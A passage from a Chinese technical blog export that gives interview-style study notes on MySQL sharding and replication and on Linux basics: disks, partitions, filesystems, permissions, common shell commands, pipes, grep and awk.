分解成多个单表查询，这些单表查询的缓存结果更可能被其它查询使用到，从而减少冗余记录的查询。 减少锁竞争； 在应用层进行连接，可以更容易对数据库进行拆分，从而更容易做到高性能和可扩展。 查询本身效率也可能会有所提升。例如下面的例子中，使用 IN() 代替连接查询，可以让 MySQL 按照 ID 顺序进行查询，这可能比随机的连接要更高效。 1234SELECT * FROM tagJOIN tag_post ON tag_post.tag_id=tag.idJOIN post ON tag_post.post_id=post.idWHERE tag.tag='mysql'; 123SELECT * FROM tag WHERE tag='mysql';SELECT * FROM tag_post WHERE tag_id=1234;SELECT * FROM post WHERE post.id IN (123,456,567,9098,8904); 五、切分水平切分 水平切分又称为 Sharding，它是将同一个表中的记录拆分到多个结构相同的表中。 当一个表的数据不断增多时，Sharding 是必然的选择，它可以将数据分布到集群的不同节点上，从而缓存单个数据库的压力。 垂直切分 垂直切分是将一张表按列切分成多个表，通常是按照列的关系密集程度进行切分，也可以利用垂直切分将经常被使用的列和不经常被使用的列切分到不同的表中。 在数据库的层面使用垂直切分将按数据库中表的密集程度部署到不同的库中，例如将原来的电商数据库垂直切分成商品数据库 payDB、用户数据库 userBD 等。 Sharding 策略 哈希取模：hash(key) % NUM_DB 范围：可以是 ID 范围也可以是时间范围 映射表：使用单独的一个数据库来存储映射关系 Sharding 存在的问题及解决方案1. 事务问题使用分布式事务来解决，比如 XA 接口。 2. JOIN可以将原来的 JOIN 查询分解成多个单表查询，然后在用户程序中进行 JOIN。 3. ID 唯一性 使用全局唯一 ID：GUID。 为每个分片指定一个 ID 范围。 分布式 ID 生成器 (如 Twitter 的 Snowflake 算法)。 更多内容请参考： How Sharding Works 大众点评订单系统分库分表实践 六、复制主从复制主要涉及三个线程：binlog 线程、I/O 线程和 SQL 线程。 binlog 线程 ：负责将主服务器上的数据更改写入二进制文件（binlog）中。 I/O 线程 ：负责从主服务器上读取二进制日志文件，并写入从服务器的中继日志中。 SQL 线程 ：负责读取中继日志并重放其中的 SQL 语句。 读写分离主服务器用来处理写操作以及实时性要求比较高的读操作，而从服务器用来处理读操作。 读写分离常用代理方式来实现，代理服务器接收应用层传来的读写请求，然后决定转发到哪个服务器。 MySQL 读写分离能提高性能的原因在于： 主从服务器负责各自的读和写，极大程度缓解了锁的争用； 从服务器可以配置 MyISAM 引擎，提升查询性能以及节约系统开销； 增加冗余，提高可用性。 参考资料 BaronScbwartz, PeterZaitsev, VadimTkacbenko, 等. 高性能 MySQL[M]. 电子工业出版社, 2013. 姜承尧. MySQL 技术内幕: InnoDB 存储引擎 [M]. 机械工业出版社, 2011. 20+ 条 MySQL 性能优化的最佳经验 服务端指南 数据存储篇 | MySQL（09） 分库与分表带来的分布式困境与应对之策 How to create unique row ID in sharded databases? SQL Azure Federation – Introduction]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2FLinux%2F</url>
    <content type="text"><![CDATA[一、常用操作以及概念 快捷键 求助 关机 PATH sudo 包管理工具 发行版 VIM 三个模式 GNU 开源协议 二、磁盘 HDD 磁盘接口 磁盘的文件名 三、分区 分区表 开机检测程序 四、文件系统 分区与文件系统 组成 文件读取 磁盘碎片 block inode 目录 日志 挂载 目录配置 五、文件 文件属性 文件与目录的基本操作 修改权限 文件默认权限 目录的权限 链接 获取文件内容 指令与文件搜索 六、压缩与打包 压缩文件名 压缩指令 打包 七、Bash 特性 变量操作 指令搜索顺序 数据流重定向 八、管线指令 提取指令 排序指令 双向输出重定向 字符转换指令 分区指令 九、正则表达式 grep printf awk 十、进程管理 查看进程 进程状态 SIGCHLD wait() waitpid() 孤儿进程 僵尸进程 参考资料 一、常用操作以及概念快捷键 Tab：命令和文件名补全； Ctrl+C：中断正在运行的程序； Ctrl+D：结束键盘输入（End Of File，EOF） 求助1. –help指令的基本用法与选项介绍。 2. manman 是 manual 的缩写，将指令的具体信息显示出来。 当执行man date时，有 DATE(1) 出现，其中的数字代表指令的类型，常用的数字及其类型如下： 代号 类型 1 用户在 shell 环境中可以操作的指令或者可执行文件 5 配置文件 8 系统管理员可以使用的管理指令 3. infoinfo 与 man 类似，但是 info 将文档分成一个个页面，每个页面可以进行跳转。 4. doc/usr/share/doc 存放着软件的一整套说明文件。 关机1. who在关机前需要先使用 who 命令查看有没有其它用户在线。 2. sync为了加快对磁盘文件的读写速度，位于内存中的文件数据不会立即同步到磁盘上，因此关机之前需要先进行 sync 同步操作。 3. shutdown12345# shutdown [-krhc] 时间 [信息]-k ： 不会关机，只是发送警告信息，通知所有在线的用户-r ： 将系统的服务停掉后就重新启动-h ： 将系统的服务停掉后就立即关机-c ： 取消已经在进行的 shutdown 指令内容 PATH可以在环境变量 PATH 中声明可执行文件的路径，路径之间用 : 分隔。 1/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/dmtsai/.local/bin:/home/dmtsai/bin env 命令可以获取当前终端的环境变量。 sudosudo 允许一般用户使用 root 可执行的命令，不过只有在 /etc/sudoers 配置文件中添加的用户才能使用该指令。 包管理工具RPM 和 DPKG 为最常见的两类软件包管理工具。RPM 全称为 Redhat Package Manager，最早由 Red Hat 公司制定实施，随后被 GNU 开源操作系统接受并成为很多 Linux 系统 (RHEL) 的既定软件标准。与 RPM 进行竞争的是基于 Debian 操作系统 (UBUNTU) 的 DEB 软件包管理工具 DPKG，全称为 Debian Package，功能方面与 RPM 相似。 YUM 基于 RPM，具有依赖管理功能，并具有软件升级的功能。 发行版Linux 发行版是 Linux 内核及各种应用软件的集成版本。 基于的包管理工具 商业发行版 社区发行版 RPM Red Hat Fedora / CentOS DPKG Ubuntu Debian VIM 三个模式 一般指令模式（Command mode）：VIM 的默认模式，可以用于移动游标查看内容； 编辑模式（Insert mode）：按下 “i” 等按键之后进入，可以对文本进行编辑； 指令列模式（Bottom-line mode）：按下 “:” 按键之后进入，用于保存退出等操作。 在指令列模式下，有以下命令用于离开或者保存文件。 命令 作用 :w 写入磁盘 :w! 当文件为只读时，强制写入磁盘。到底能不能写入，与用户对该文件的权限有关 :q 离开 :q! 强制离开不保存 :wq 写入磁盘后离开 :wq! 强制写入磁盘后离开 GNUGNU 计划，译为革奴计划，它的目标是创建一套完全自由的操作系统，称为 GNU，其内容软件完全以 GPL 方式发布。其中 GPL 全称为 GNU 通用公共许可协议，包含了以下内容： 以任何目的运行此程序的自由； 再复制的自由； 改进此程序，并公开发布改进的自由。 开源协议 Choose an open source license 如何选择开源许可证？ 二、磁盘HDDHard Disk Drives(HDD) 俗称硬盘，具有以下结构： 盘面（Platter）：一个硬盘有多个盘面； 磁道（Track）：盘面上的圆形带状区域，一个盘面可以有多个磁道； 扇区（Track Sector）：磁道上的一个弧段，一个磁道可以有多个扇区，它是最小的物理储存单位，目前主要有 512 bytes 与 4 K 两种大小； 磁头（Head）：与盘面非常接近，能够将盘面上的磁场转换为电信号（读），或者将电信号转换为盘面的磁场（写）； 制动手臂（Actuator arm）：用于在磁道之间移动磁头； 主轴（Spindle）：使整个盘面转动。 Decoding UCS Invicta – Part 1 磁盘接口1. IDEIDE（ATA）全称 Advanced Technology Attachment，接口速度最大为 133MB/s，因为并口线的抗干扰性太差，且排线占用空间较大，不利电脑内部散热，已逐渐被 SATA 所取代。 2. SATASATA 全称 Serial ATA，也就是使用串口的 ATA 接口，因抗干扰性强，且对数据线的长度要求比 ATA 低很多，支持热插拔等功能，SATA-II 的接口速度为 300MiB/s，而新的 SATA-III 标准可达到 600MiB/s 的传输速度。SATA 的数据线也比 ATA 的细得多，有利于机箱内的空气流通，整理线材也比较方便。 3. SCSISCSI 全称是 Small Computer System Interface（小型机系统接口），经历多代的发展，从早期的 SCSI-II，到目前的 Ultra320 SCSI 以及 Fiber-Channel（光纤通道），接口型式也多种多样。SCSI 硬盘广为工作站级个人电脑以及服务器所使用，因此会使用较为先进的技术，如碟片转速 15000rpm 的高转速，且资料传输时 CPU 占用率较低，但是单价也比相同容量的 ATA 及 SATA 硬盘更加昂贵。 4. SASSAS（Serial Attached SCSI）是新一代的 SCSI 技术，和 SATA 硬盘相同，都是采取序列式技术以获得更高的传输速度，可达到 6Gb/s。此外也透过缩小连接线改善系统内部空间等。 磁盘的文件名Linux 中每个硬件都被当做一个文件，包括磁盘。磁盘以磁盘接口类型进行命名，常见磁盘的文件名如下： IDE 磁盘：/dev/hd[a-d] SATA/SCSI/SAS 磁盘：/dev/sd[a-p] 其中文件名后面的序号的确定与系统检测到磁盘的顺序有关，而与磁盘所插入的插槽位置无关。 三、分区分区表磁盘分区表主要有两种格式，一种是限制较多的 MBR 分区表，一种是较新且限制较少的 GPT 分区表。 1. MBRMBR 中，第一个扇区最重要，里面有主要开机记录（Master boot record, MBR）及分区表（partition table），其中主要开机记录占 446 bytes，分区表占 64 bytes。 分区表只有 64 bytes，最多只能存储 4 个分区，这 4 个分区为主分区（Primary）和扩展分区（Extended）。其中扩展分区只有一个，它将其它扇区用来记录分区表，因此通过扩展分区可以分出更多分区，这些分区称为逻辑分区。 Linux 也把分区当成文件，分区文件的命名方式为：磁盘文件名 + 编号，例如 /dev/sda1。注意，逻辑分区的编号从 5 开始。 2. GPT不同的磁盘有不同的扇区大小，例如 512 bytes 和最新磁盘的 4 k。GPT 为了兼容所有磁盘，在定义扇区上使用逻辑区块地址（Logical Block Address, LBA），LBA 默认大小为 512 bytes。 GPT 第 1 个区块记录了主要开机记录（MBR），紧接着是 33 个区块记录分区信息，并把最后的 33 个区块用于对分区信息进行备份。这 33 个区块第一个为 GPT 表头纪录，这个部份纪录了分区表本身的位置与大小和备份分区的位置，同时放置了分区表的校验码 (CRC32)，操作系统可以根据这个校验码来判断 GPT 是否正确。若有错误，可以使用备份分区进行恢复。 GPT 没有扩展分区概念，都是主分区，每个 LAB 可以分 4 个分区，因此总共可以分 4 * 32 = 128 个分区。 MBR 不支持 2.2 TB 以上的硬盘，GPT 则最多支持到 233 TB = 8 ZB。 开机检测程序1. BIOSBIOS（Basic Input/Output System，基本输入输出系统），它是一个固件（嵌入在硬件中的软件），BIOS 程序存放在断电后内容不会丢失的只读内存中。 BIOS 是开机的时候计算机执行的第一个程序，这个程序知道可以开机的磁盘，并读取磁盘第一个扇区的主要开机记录（MBR），由主要开机记录（MBR）执行其中的开机管理程序，这个开机管理程序会加载操作系统的核心文件。 主要开机记录（MBR）中的开机管理程序提供以下功能：选单、载入核心文件以及转交其它开机管理程序。转交这个功能可以用来实现了多重引导，只需要将另一个操作系统的开机管理程序安装在其它分区的启动扇区上，在启动开机管理程序时，就可以通过选单选择启动当前的操作系统或者转交给其它开机管理程序从而启动另一个操作系统。 下图中，第一扇区的主要开机记录（MBR）中的开机管理程序提供了两个选单：M1、M2，M1 指向了 Windows 操作系统，而 M2 指向其它分区的启动扇区，里面包含了另外一个开机管理程序，提供了一个指向 Linux 的选单。 安装多重引导，最好先安装 Windows 再安装 Linux。因为安装 Windows 时会覆盖掉主要开机记录（MBR），而 Linux 可以选择将开机管理程序安装在主要开机记录（MBR）或者其它分区的启动扇区，并且可以设置开机管理程序的选单。 2. UEFIBIOS 不可以读取 GPT 分区表，而 UEFI 可以。 四、文件系统分区与文件系统对分区进行格式化是为了在分区上建立文件系统。一个分区通常只能格式化为一个文件系统，但是磁盘阵列等技术可以将一个分区格式化为多个文件系统。 组成 最主要的几个组成部分如下： inode：一个文件占用一个 inode，记录文件的属性，同时记录此文件的内容所在的 block 编号； block：记录文件的内容，文件太大时，会占用多个 block。 除此之外还包括： superblock：记录文件系统的整体信息，包括 inode 和 block 的总量、使用量、剩余量，以及文件系统的格式与相关信息等； block bitmap：记录 block 是否被使用的位域； 文件读取对于 Ext2 文件系统，当要读取一个文件的内容时，先在 inode 中去查找文件内容所在的所有 block，然后把所有 block 的内容读出来。 而对于 FAT 文件系统，它没有 inode，每个 block 中存储着下一个 block 的编号。 磁盘碎片指一个文件内容所在的 block 过于分散。 block在 Ext2 文件系统中所支持的 block 大小有 1K，2K 及 4K 三种，不同的大小限制了单个文件和文件系统的最大大小。 大小 1KB 2KB 4KB 最大单一文件 16GB 256GB 2TB 最大文件系统 2TB 8TB 16TB 一个 block 只能被一个文件所使用，未使用的部分直接浪费了。因此如果需要存储大量的小文件，那么最好选用比较小的 block。 inodeinode 具体包含以下信息： 权限 (read/write/excute)； 拥有者与群组 (owner/group)； 容量； 建立或状态改变的时间 (ctime)； 最近一次的读取时间 (atime)； 最近修改的时间 (mtime)； 定义文件特性的旗标 (flag)，如 SetUID…； 该文件真正内容的指向 (pointer)。 inode 具有以下特点： 每个 inode 大小均固定为 128 bytes (新的 ext4 与 xfs 可设定到 256 bytes)； 每个文件都仅会占用一个 inode。 inode 中记录了文件内容所在的 block 编号，但是每个 block 非常小，一个大文件随便都需要几十万的 block。而一个 inode 大小有限，无法直接引用这么多 block 编号。因此引入了间接、双间接、三间接引用。间接引用是指，让 inode 记录的引用 block 块记录引用信息。 目录建立一个目录时，会分配一个 inode 与至少一个 block。block 记录的内容是目录下所有文件的 inode 编号以及文件名。可以看出文件的 inode 本身不记录文件名，文件名记录在目录中，因此新增文件、删除文件、更改文件名这些操作与目录的 w 权限有关。 日志如果突然断电，那么文件系统会发生错误，例如断电前只修改了 block bitmap，而还没有将数据真正写入 block 中。 ext3/ext4 文件系统引入了日志功能，可以利用日志来修复文件系统。 挂载挂载利用目录作为文件系统的进入点，也就是说，进入目录之后就可以读取文件系统的数据。 目录配置为了使不同 Linux 发行版本的目录结构保持一致性，Filesystem Hierarchy Standard (FHS) 规定了 Linux 的目录结构。最基础的三个目录如下： / (root, 根目录) /usr (unix software resource)：所有系统默认软件都会安装到这个目录； /var (variable)：存放系统或程序运行过程中的数据文件。 五、文件文件属性用户分为三种：文件拥有者、群组以及其它人，对不同的用户有不同的文件权限。 使用 ls 查看一个文件时，会显示一个文件的信息，例如 drwxr-xr-x. 3 root root 17 May 6 00:14 .config，对这个信息的解释如下： drwxr-xr-x：文件类型以及权限，第 1 位为文件类型字段，后 9 位为文件权限字段 3：链接数 root：文件拥有者 root：所属群组 17：文件大小 May 6 00:14：文件最后被修改的时间 .config：文件名 常见的文件类型及其含义有： d：目录 -：文件 l：链接文件 9 位的文件权限字段中，每 3 个为一组，共 3 组，每一组分别代表对文件拥有者、所属群组以及其它人的文件权限。一组权限中的 3 位分别为 r、w、x 权限，表示可读、可写、可执行。 文件时间有以下三种： modification time (mtime)：文件的内容更新就会更新； status time (ctime)：文件的状态（权限、属性）更新就会更新； access time (atime)：读取文件时就会更新。 文件与目录的基本操作1. ls列出文件或者目录的信息，目录的信息就是其中包含的文件。 1234# ls [-aAdfFhilnrRSt] file|dir-a ：列出全部的文件-d ：仅列出目录本身-l ：以长数据串行列出，包含文件的属性与权限等等数据 2. cd更换当前目录。 1cd [相对路径或绝对路径] 3. mkdir创建目录。 123# mkdir [-mp] 目录名称-m ：配置目录权限-p ：递归创建目录 4. rmdir删除目录，目录必须为空。 12rmdir [-p] 目录名称-p ：递归删除目录 5. touch更新文件时间或者建立新文件。 123456# touch [-acdmt] filename-a ： 更新 atime-c ： 更新 ctime，若该文件不存在则不建立新文件-m ： 更新 mtime-d ： 后面可以接更新日期而不使用当前日期，也可以使用 --date="日期或时间"-t ： 后面可以接更新时间而不使用当前时间，格式为[YYYYMMDDhhmm] 6. cp复制文件。 如果源文件有两个以上，则目的文件一定要是目录才行。 12345678cp [-adfilprsu] source destination-a ：相当于 -dr --preserve=all 的意思，至于 dr 请参考下列说明-d ：若来源文件为链接文件，则复制链接文件属性而非文件本身-i ：若目标文件已经存在时，在覆盖前会先询问-p ：连同文件的属性一起复制过去-r ：递归持续复制-u ：destination 比 source 旧才更新 destination，或 destination 不存在的情况下才复制--preserve=all ：除了 -p 的权限相关参数外，还加入 SELinux 的属性, links, xattr 等也复制了 7. rm删除文件。 12# rm [-fir] 文件或目录-r ：递归删除 8. mv移动文件。 123# mv [-fiu] source destination# mv [options] source1 source2 source3 .... directory-f ： force 强制的意思，如果目标文件已经存在，不会询问而直接覆盖 修改权限可以将一组权限用数字来表示，此时一组权限的 3 个位当做二进制数字的位，从左到右每个位的权值为 4、2、1，即每个权限对应的数字权值为 r : 4、w : 2、x : 1。 1# chmod [-R] xyz dirname/filename 示例：将 .bashrc 文件的权限修改为 -rwxr-xr–。 1# chmod 754 .bashrc 也可以使用符号来设定权限。 12345678# chmod [ugoa] [+-=] [rwx] dirname/filename- u：拥有者- g：所属群组- o：其他人- a：所有人- +：添加权限- -：移除权限- =：设定权限 示例：为 .bashrc 文件的所有用户添加写权限。 1# chmod a+w .bashrc 文件默认权限 文件默认权限：文件默认没有可执行权限，因此为 666，也就是 -rw-rw-rw- 。 目录默认权限：目录必须要能够进入，也就是必须拥有可执行权限，因此为 777 ，也就是 drwxrwxrwx。 可以通过 umask 设置或者查看文件的默认权限，通常以掩码的形式来表示，例如 002 表示其它用户的权限去除了一个 2 的权限，也就是写权限，因此建立新文件时默认的权限为 -rw-rw-r–。 目录的权限文件名不是存储在一个文件的内容中，而是存储在一个文件所在的目录中。因此，拥有文件的 w 权限并不能对文件名进行修改。 目录存储文件列表，一个目录的权限也就是对其文件列表的权限。因此，目录的 r 权限表示可以读取文件列表；w 权限表示可以修改文件列表，具体来说，就是添加删除文件，对文件名进行修改；x 权限可以让该目录成为工作目录，x 权限是 r 和 w 权限的基础，如果不能使一个目录成为工作目录，也就没办法读取文件列表以及对文件列表进行修改了。 链接123# ln [-sf] source_filename dist_filename-s ：默认是 hard link，加 -s 为 symbolic link-f ：如果目标文件存在时，先删除目标文件 1. 实体链接在目录下创建一个条目，记录着文件名与 inode 编号，这个 inode 就是源文件的 inode。 删除任意一个条目，文件还是存在，只要引用数量不为 0。 有以下限制：不能跨越文件系统、不能对目录进行链接。 1234# ln /etc/crontab .# ll -i /etc/crontab crontab34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 crontab34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 /etc/crontab 2. 符号链接符号链接文件保存着源文件所在的绝对路径，在读取时会定位到源文件上，可以理解为 Windows 的快捷方式。 当源文件被删除了，链接文件就打不开了。 可以为目录建立链接。 123# ll -i /etc/crontab /root/crontab234474855 -rw-r--r--. 2 root root 451 Jun 10 2014 /etc/crontab53745909 lrwxrwxrwx. 1 root root 12 Jun 23 22:31 /root/crontab2 -&gt; /etc/crontab 获取文件内容1. cat取得文件内容。 12# cat [-AbEnTv] filename-n ：打印出行号，连同空白行也会有行号，-b 不会 2. tac是 cat 的反向操作，从最后一行开始打印。 3. more和 cat 不同的是它可以一页一页查看文件内容，比较适合大文件的查看。 4. less和 more 类似，但是多了一个向前翻页的功能。 5. head取得文件前几行。 12# head [-n number] filename-n ：后面接数字，代表显示几行的意思 6. tail是 head 的反向操作，只是取得是后几行。 7. od以字符或者十六进制的形式显示二进制文件。 指令与文件搜索1. which指令搜索。 12# which [-a] command-a ：将所有指令列出，而不是只列第一个 2. whereis文件搜索。速度比较快，因为它只搜索几个特定的目录。 1# whereis [-bmsu] dirname/filename 3. locate文件搜索。可以用关键字或者正则表达式进行搜索。 locate 使用 /var/lib/mlocate/ 这个数据库来进行搜索，它存储在内存中，并且每天更新一次，所以无法用 locate 搜索新建的文件。可以使用 updatedb 来立即更新数据库。 12# locate [-ir] keyword-r：正则表达式 4. find文件搜索。可以使用文件的属性和权限进行搜索。 12# find [basedir] [option]example: find . -name "shadow*" （一）与时间有关的选项 1234-mtime n ：列出在 n 天前的那一天修改过内容的文件-mtime +n ：列出在 n 天之前 (不含 n 天本身) 修改过内容的文件-mtime -n ：列出在 n 天之内 (含 n 天本身) 修改过内容的文件-newer file ： 列出比 file 更新的文件 +4、4 和 -4 的指示的时间范围如下： （二）与文件拥有者和所属群组有关的选项 123456-uid n-gid n-user name-group name-nouser ：搜索拥有者不存在 /etc/passwd 的文件-nogroup：搜索所属群组不存在于 /etc/group 的文件 （三）与文件权限和名称有关的选项 123456-name filename-size [+-]SIZE：搜寻比 SIZE 还要大 (+) 或小 (-) 的文件。这个 SIZE 的规格有：c: 代表 byte，k: 代表 1024bytes。所以，要找比 50KB 还要大的文件，就是 -size +50k-type TYPE-perm mode ：搜索权限等于 mode 的文件-perm -mode ：搜索权限包含 mode 的文件-perm /mode ：搜索权限包含任一 mode 的文件 六、压缩与打包压缩文件名Linux 底下有很多压缩文件名，常见的如下： 扩展名 压缩程序 *.Z compress *.zip zip *.gz gzip *.bz2 bzip2 *.xz xz *.tar tar 程序打包的数据，没有经过压缩 *.tar.gz tar 程序打包的文件，经过 gzip 的压缩 *.tar.bz2 tar 程序打包的文件，经过 bzip2 的压缩 *.tar.xz tar 程序打包的文件，经过 xz 的压缩 压缩指令1. gzipgzip 是 Linux 使用最广的压缩指令，可以解开 compress、zip 与 gzip 所压缩的文件。 经过 gzip 压缩过，源文件就不存在了。 有 9 个不同的压缩等级可以使用。 可以使用 zcat、zmore、zless 来读取压缩文件的内容。 123456$ gzip [-cdtv#] filename-c ：将压缩的数据输出到屏幕上-d ：解压缩-t ：检验压缩文件是否出错-v ：显示压缩比等信息-# ： # 为数字的意思，代表压缩等级，数字越大压缩比越高，默认为 6 2. bzip2提供比 gzip 更高的压缩比。 查看命令：bzcat、bzmore、bzless、bzgrep。 12$ bzip2 [-cdkzv#] filename-k ：保留源文件 3. xz提供比 bzip2 更佳的压缩比。 可以看到，gzip、bzip2、xz 的压缩比不断优化。不过要注意的是，压缩比越高，压缩的时间也越长。 查看命令：xzcat、xzmore、xzless、xzgrep。 1$ xz [-dtlkc#] filename 打包压缩指令只能对一个文件进行压缩，而打包能够将多个文件打包成一个大文件。tar 不仅可以用于打包，也可以使用 gip、bzip2、xz 将打包文件进行压缩。 123456789101112$ tar [-z|-j|-J] [cv] [-f 新建的 tar 文件] filename... ==打包压缩$ tar [-z|-j|-J] [tv] [-f 已有的 tar 文件] ==查看$ tar [-z|-j|-J] [xv] [-f 已有的 tar 文件] [-C 目录] ==解压缩-z ：使用 zip；-j ：使用 bzip2；-J ：使用 xz；-c ：新建打包文件；-t ：查看打包文件里面有哪些文件；-x ：解打包或解压缩的功能；-v ：在压缩/解压缩的过程中，显示正在处理的文件名；-f : filename：要处理的文件；-C 目录 ： 在特定目录解压缩。 使用方式 命令 打包压缩 tar -jcv -f filename.tar.bz2 要被压缩的文件或目录名称 查 看 tar -jtv -f filename.tar.bz2 解压缩 tar -jxv -f filename.tar.bz2 -C 要解压缩的目录 七、Bash可以通过 Shell 请求内核提供服务，Bash 正是 Shell 的一种。 特性 命令历史：记录使用过的命令 命令与文件补全：快捷键：tab 命名别名：例如 lm 是 ls -al 的别名 shell scripts 通配符：例如 ls -l /usr/bin/X* 列出 /usr/bin 下面所有以 X 开头的文件 变量操作对一个变量赋值直接使用 =。 对变量取用需要在变量前加上 \$ ，也可以用 \${} 的形式； 输出变量使用 echo 命令。 123$ x=abc$ echo $x$ echo $&#123;x&#125; 变量内容如果有空格，必须使用双引号或者单引号。 双引号内的特殊字符可以保留原本特性，例如 x=”lang is \$LANG”，则 x 的值为 lang is zh_TW.UTF-8； 单引号内的特殊字符就是特殊字符本身，例如 x=’lang is \$LANG’，则 x 的值为 lang is \$LANG。 可以使用 `指令` 或者 \$(指令) 的方式将指令的执行结果赋值给变量。例如 version=\$(uname -r)，则 version 的值为 4.15.0-22-generic。 可以使用 export 命令将自定义变量转成环境变量，环境变量可以在子程序中使用，所谓子程序就是由当前 Bash 而产生的子 Bash。 Bash 的变量可以声明为数组和整数数字。注意数字类型没有浮点数。如果不进行声明，默认是字符串类型。变量的声明使用 declare 命令： 12345$ declare [-aixr] variable-a ： 定义为数组类型-i ： 定义为整数类型-x ： 定义为环境变量-r ： 定义为 readonly 类型 使用 [ ] 来对数组进行索引操作： 123$ array[1]=a$ array[2]=b$ echo $&#123;array[1]&#125; 指令搜索顺序 以绝对或相对路径来执行指令，例如 /bin/ls 或者 ./ls ； 由别名找到该指令来执行； 由 Bash 内建的指令来执行； 按 \$PATH 变量指定的搜索路径的顺序找到第一个指令来执行。 数据流重定向重定向指的是使用文件代替标准输入、标准输出和标准错误输出。 1 代码 运算符 标准输入 (stdin) 0 &lt; 或 &lt;&lt; 标准输出 (stdout) 1 &gt; 或 &gt;&gt; 标准错误输出 (stderr) 2 2&gt; 或 2&gt;&gt; 其中，有一个箭头的表示以覆盖的方式重定向，而有两个箭头的表示以追加的方式重定向。 可以将不需要的标准输出以及标准错误输出重定向到 /dev/null，相当于扔进垃圾箱。 如果需要将标准输出以及标准错误输出同时重定向到一个文件，需要将某个输出转换为另一个输出，例如 2&gt;&amp;1 表示将标准错误输出转换为标准输出。 1$ find /home -name .bashrc &gt; list 2&gt;&amp;1 八、管线指令管线是将一个命令的标准输出作为另一个命令的标准输入，在数据需要经过多个步骤的处理之后才能得到我们想要的内容时就可以使用管线。 在命令之间使用 | 分隔各个管线命令。 1$ ls -al /etc | less 提取指令cut 对数据进行切分，取出想要的部分。切分过程一行一行地进行。 1234$ cut-d ：分隔符-f ：经过 -d 分隔后，使用 -f n 取出第 n 个区间-c ：以字符为单位取出区间 示例 1：last 显示登入者的信息，取出用户名。 123456$ lastroot pts/1 192.168.201.101 Sat Feb 7 12:35 still logged inroot pts/1 192.168.201.101 Fri Feb 6 12:13 - 18:46 (06:33)root pts/1 192.168.201.254 Thu Feb 5 22:37 - 23:53 (01:16)$ last | cut -d ' ' -f 1 示例 2：将 export 输出的讯息，取出第 12 字符以后的所有字符串。 12345678$ exportdeclare -x HISTCONTROL="ignoredups"declare -x HISTSIZE="1000"declare -x HOME="/home/dmtsai"declare -x HOSTNAME="study.centos.vbird".....(其他省略).....$ export | cut -c 12 排序指令sort 进行排序。 123456789$ sort [-fbMnrtuk] [file or stdin]-f ：忽略大小写-b ：忽略最前面的空格-M ：以月份的名字来排序，例如 JAN，DEC-n ：使用数字-r ：反向排序-u ：相当于 unique，重复的内容只出现一次-t ：分隔符，默认为 tab-k ：指定排序的区间 示例：/etc/passwd 文件内容以 : 来分隔，要求以第三列进行排序。 12345$ cat /etc/passwd | sort -t ':' -k 3root:x:0:0:root:/root:/bin/bashdmtsai:x:1000:1000:dmtsai:/home/dmtsai:/bin/bashalex:x:1001:1002::/home/alex:/bin/basharod:x:1002:1003::/home/arod:/bin/bash uniq 可以将重复的数据只取一个。 123$ uniq [-ic]-i ：忽略大小写-c ：进行计数 示例：取得每个人的登录总次数 1234567$ last | cut -d ' ' -f 1 | sort | uniq -c16 (unknown47 dmtsai4 reboot7 root1 wtmp 双向输出重定向输出重定向会将输出内容重定向到文件中，而 tee 不仅能够完成这个功能，还能保留屏幕上的输出。也就是说，使用 tee 指令，一个输出会同时传送到文件和屏幕上。 1$ tee [-a] file 字符转换指令tr 用来删除一行中的字符，或者对字符进行替换。 12$ tr [-ds] SET1 ...-d ： 删除行中 SET1 这个字符串 示例，将 last 输出的信息所有小写转换为大写。 1$ last | tr '[a-z]' '[A-Z]' col 将 tab 字符转为空格字符。 12$ col [-xb]-x ： 将 tab 键转换成对等的空格键 expand 将 tab 转换一定数量的空格，默认是 8 个。 12$ expand [-t] file-t ：tab 转为空格的数量 join 将有相同数据的那一行合并在一起。 12345$ join [-ti12] file1 file2-t ：分隔符，默认为空格-i ：忽略大小写的差异-1 ：第一个文件所用的比较字段-2 ：第二个文件所用的比较字段 paste 直接将两行粘贴在一起。 12$ paste [-d] file1 file2-d ：分隔符，默认为 tab 分区指令split 将一个文件划分成多个文件。 1234$ split [-bl] file PREFIX-b ：以大小来进行分区，可加单位，例如 b, k, m 等-l ：以行数来进行分区。- PREFIX ：分区文件的前导名称 九、正则表达式grepg/re/p（globally search a regular expression and print)，使用正则表示式进行全局查找并打印。 123456$ grep [-acinv] [--color=auto] 搜寻字符串 filename-c ： 计算找到个数-i ： 忽略大小写-n ： 输出行号-v ： 反向选择，亦即显示出没有 搜寻字符串 内容的那一行--color=auto ：找到的关键字加颜色显示 示例：把含有 the 字符串的行提取出来（注意默认会有 –color=auto 选项，因此以下内容在 Linux 中有颜色显示 the 字符串） 123456$ grep -n 'the' regular_express.txt8:I can't finish the test.12:the symbol '*' is represented as start.15:You are the best is mean you are the no. 1.16:The world Happy is the same with "glad".18:google is the best tools for search keyword 因为 { 和 } 在 shell 是有特殊意义的，因此必须要使用转义字符进行转义。 1$ grep -n 'go\&#123;2,5\&#125;g' regular_express.txt printf用于格式化输出。 它不属于管道命令，在给 printf 传数据时需要使用 $( ) 形式。 1234$ printf '%10s %5i %5i %5i %8.2f \n' $(cat printf.txt) DmTsai 80 60 92 77.33 VBird 75 55 80 70.00 Ken 60 90 70 73.33 awk是由 Alfred Aho，Peter Weinberger, 和 Brian Kernighan 创造，awk 这个名字就是这三个创始人名字的首字母。 awk 每次处理一行，处理的最小单位是字段，每个字段的命名方式为：\$n，n 为字段号，从 1 开始，\$0 表示一整行。 示例 1：取出登录用户的用户名和 ip 12345678$ last -n 5dmtsai pts/0 192.168.1.100 Tue Jul 14 17:32 still logged indmtsai pts/0 192.168.1.100 Thu Jul 9 23:36 - 02:58 (03:22)dmtsai pts/0 192.168.1.100 Thu Jul 9 17:23 - 23:36 (06:12)dmtsai pts/0 192.168.1.100 Thu Jul 9 08:02 - 08:17 (00:14)dmtsai tty1 Fri May 29 11:55 - 12:11 (00:15)$ last -n 5 | awk '&#123;print $1 "\t" $3&#125; 可以根据字段的某些条件进行匹配，例如匹配字段小于某个值的那一行数据。 1$ awk '条件类型 1 &#123;动作 1&#125; 条件类型 2 &#123;动作 2&#125; ...' filename 示例 2：/etc/passwd 